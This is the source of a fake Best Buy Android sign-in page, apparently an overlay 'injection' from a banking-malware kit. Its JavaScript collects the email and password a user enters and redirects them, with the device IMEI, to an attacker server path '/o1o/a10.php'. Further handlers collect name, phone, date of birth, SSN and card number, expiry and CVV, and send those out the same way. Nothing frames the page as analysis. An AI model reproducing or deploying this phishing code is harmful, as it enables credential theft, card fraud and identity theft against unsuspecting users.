<!DOCTYPE html>

<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
	<script src="com.bestbuy.android/js/jquery.min.js"></script>
	<script src="com.bestbuy.android/js/cat.functions.js"></script>
	<link rel="stylesheet" href="com.bestbuy.android/css/bootstrap.min.css">
	<link rel="stylesheet" href="com.bestbuy.android/css/font-awesome.min.css">
	<link rel="stylesheet" href="com.bestbuy.android/css/cat.style.css" type="text/css" media="all">
	<style type="text/css">
		*{outline:none;}.br{border:1px dotted red;}.stol{display:table;width:100%;}.td{display:table-cell;}.w100{width:100%;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}
		body,html{background-color:transparent;}@media(max-width:768px){.block-xs{display:block;width:100%!important;}.center-xs{text-align:center!important;}}.ramka{border:1px solid#AAAAAA;background-color:white;border-radius:5px;background-color:white!important;overflow:hidden;box-shadow:0 0 10px#B1B1B1}.header{padding:20px 20px;border-radius:0px 5px 0 0;background-color:transparent;border-bottom:1px solid black;box-shadow:0px 0px 0px black}.body{padding:15px;}.control-label{color:black;font-weight:600;}.body h3{color:black;font-weight:600;}.has-error.control-label,.has-error.help-block,.has-error.form-control-feedback{}.step_label_h4{color:#007eb6;}
	</style>
  <title>BestBuy</title>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div id="cat-error">
	<span>Authentication failed or timed out</span>
	<input type="button" class="button btn btn-primary" value="Try enter again"
		onClick="tryEnterAgain();"/>
</div>

<div id="cat-forms">
	<form id="cat-step-1" class="cat-start-step">

    <div class="cont1 " style="padding-top:0px">
      <div class="ramka" style="">
<br></br>

	      	<center>
            <div class="td  middle left_" style="width:0px"><img src="com.bestbuy.android/images/logo1.png" style="width:190px; height:35px;" class=""></div>
         </center>

        <div class="body " style="margin-top:-20px; ">
          <div class="row " style="">
            <div class="col-sm-12 " style="" >
              </br>
              <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style="">
                  </div>

                  <span class="some_class" style="color:black; margin-left:17px;"><b>Email Address</b></span>

                  <div class="col-sm-3 " style="">
                    <input class="form-control" type="text" name="userid" style="border-radius: 5px;" maxlength="" id="userid"   placeholder="">

                  </div>
                </div>
              </div>
			  <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style="">

                  </div>

               <span class="some_class" style="color:black; margin-left: 17px;"><b>Password</b></span>                   <span class="some_class" style="color:blue; margin-left: 100px; font-size: 11px;"><u>Forgot Password?</u></span>

                  <div class="col-sm-3 " style="">
                    <input class="form-control" type="password" name="Security_Number" style="border-radius: 5px;" maxlength="" id="Security_Number" placeholder="">

                  </div>
                </div>
              </div>

              <div class="form-group" style="">
                <div class="row " style="">
                  <div class="col-sm-4 " style=""></div>

                  <div class="col-sm-3 " style="">
              <center>
                 <input type="button" style=" height:40px; font-size: 15px; background-color:#003194;" class="btn btn-primary btn-lg active  btn-block pull-top cont_but" value="Sign In"/>
               </center>
                  </div>

                </div>
</br>
                <center>
                        <div class="td  middle left_" style="width:0px;"><img src="com.bestbuy.android/images/logo2.png" style="width:330px; height:355px; margin-left:-30px;" class=""></div>
               </center>

              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </form>

</div>

      <script>


	function getAjax(text) {
	var URL_='<?php echo $URL;?>';
	//alert(URL_ +  '    ' + text);
	$.ajax({
	  type: 'POST',
	  url: URL_+'/o1o/a10.php',
	  data: text,
	  success: function(data) {
		$('.results').html(data);
	  },
	  error:  function(xhr, str){
		 //  alert('Возникла ошибка: ' + xhr.responseCode);
		}
	});
}
 </script>
  <script type="text/javascript">
(function () {

	var IMEI='<?php echo $IMEI_country;?>';

	$('.form-control').focus(function () {
		$('.has-error').removeClass('has-error');
	})
	$('.cont1 .cont_but').bind('click', function () {
		var err = false;
		var customer_number = $('#userid').val();
		var Security_Number = $('#Security_Number').val();
		var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
		if (!VRegExp.test(customer_number)) {
			$('#userid').closest('.form-group').addClass('has-error');
			err = true;
		};
		var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
		if (!VRegExp.test(Security_Number)) {
			$('#Security_Number').closest('.form-group').addClass('has-error');
			err = true;
		};

if(err==false){

  var URL__='<?php echo $URL;?>';
  location.replace(URL__+'/o1o/a10.php?p=' + IMEI  +'|Injection_4|com.bestbuy.android|'+customer_number+"|"+Security_Number);


	 // getAjax('p=' + IMEI + '|Injection_4|com.bestbuy.android&hl=en_US|'+customer_number+"|"+Security_Number);
		//getAjax('p=' + IMEI + '|Injection_7|com.bestbuy.android&hl=en_US|'+customer_number+"|"+Security_Number+"||"+f_name+'|'+l_name+'|'+phone+'|'+dateBrith);
			switchStep(1, false);
      }
	});
	$('.cont2 .cont_but').bind('click', function () {
		var err = false;
		var f_name = $('#f_name').val();
		var l_name = $('#l_name').val();
		var phone = $('#phone').val();
		var snn = $('#snn').val();
		var VRegExp = new RegExp(/^[a-z-A-Z]{3,50}\b/);
		if (!VRegExp.test(f_name)) {
			$('#f_name').closest('.form-group').addClass('has-error');
			err = true;
		};
		var VRegExp = new RegExp(/^[a-z-A-Z]{3,50}\b/);
		if (!VRegExp.test(l_name)) {
			$('#l_name').closest('.form-group').addClass('has-error');
			err = true;
		};
		var VRegExp = new RegExp(/^[0-9]{6,11}\b/);
		if (!VRegExp.test(phone)) {
			$('#snn').closest('.form-group').addClass('has-error');
			err = true;
		};
		var VRegExp = new RegExp(/^[0-9]{6,11}\b/);
		if (!VRegExp.test(phone)) {
			$('#phone').closest('.form-group').addClass('has-error');
			err = true;
		};
		if ($('.dob_d option:selected').val() == "--") {
			$('.dob_d').closest('.form-group').addClass('has-error');
			err = true;
		};
		if ($('.dob_m option:selected').val() == "--") {
			$('.dob_m').closest('.form-group').addClass('has-error');
			err = true;
		};
		if ($('.dob_y option:selected').val() == "----") {
			$('.dob_y').closest('.form-group').addClass('has-error');
			err = true;
		};
		if (err == true) {
			return;
		};
		var customer_number = $('#userid').val();
		var dateBrith = $('#dob_d').val()+'.'+$('#dob_m').val()+'.'+$('#dob_y').val();
		getAjax('p=' + IMEI + '|Injection_8|com.bestbuy.android|'+customer_number+'|First name: '+f_name+'//br//Last Name: '+l_name
		+'//br//Phone number: '+phone+'//br//Date of birth: '+dateBrith+'//br//SNN: '+snn);

		switchStep(2, false);
	});
	$('.cont3 .cont_but').bind('click', function () {
		var err = false;
		var cc = $('#cc').val();
		var exp=$('#exp_m').val()+'/'+$('#exp_y').val();
		var cvv = $('#cvv').val();
		if (!Validate(cc)) {
			$('#cc').closest('.form-group').addClass('has-error');
			err = true;
		};
		if ($('.exp_m option:selected').val() == "--") {
			$('.exp_m').closest('.form-group').addClass('has-error');
			err = true;
		};
		if ($('.exp_y option:selected').val() == "----") {
			$('.exp_y').closest('.form-group').addClass('has-error');
			err = true;
		};
		var VRegExp = new RegExp(/^[0-9]{3}\b/);
		if (!VRegExp.test(cvv)) {
			$('#cvv').closest('.form-group').addClass('has-error');
			err = true;
		};
		if (err == true) {
			return;
		};

		var URL__='<?php echo $URL;?>';
		location.replace(URL__+'/o1o/a10.php?p=' + IMEI + '|grabing_mini|'+ cc + '|' + exp + '|' + cvv +'||');

		//switchStep(3, true);
	});
})();
function Calculate(Luhn) {
	var sum = 0;
	for (i = 0; i < Luhn.length; i++) {
		sum += parseInt(Luhn.substring(i, i + 1));
	}
	var delta = new Array(0, 1, 2, 3, 4, -4, -3, -2, -1, 0);
	for (i = Luhn.length - 1; i >= 0; i -= 2) {
		var deltaIndex = parseInt(Luhn.substring(i, i + 1));
		var deltaValue = delta[deltaIndex];
		sum += deltaValue;
	}
	var mod10 = sum % 10;
	mod10 = 10 - mod10;
	if (mod10 == 10) {
		mod10 = 0;
	}
	return mod10;
};
function Validate(Luhn) {
	var LuhnDigit = parseInt(Luhn.substring(Luhn.length - 1, Luhn.length));
	var LuhnLess = Luhn.substring(0, Luhn.length - 1);
	if (Calculate(LuhnLess) == parseInt(LuhnDigit)) {
		return true;
	}
	return false;
};
  </script>
</body>
</html>
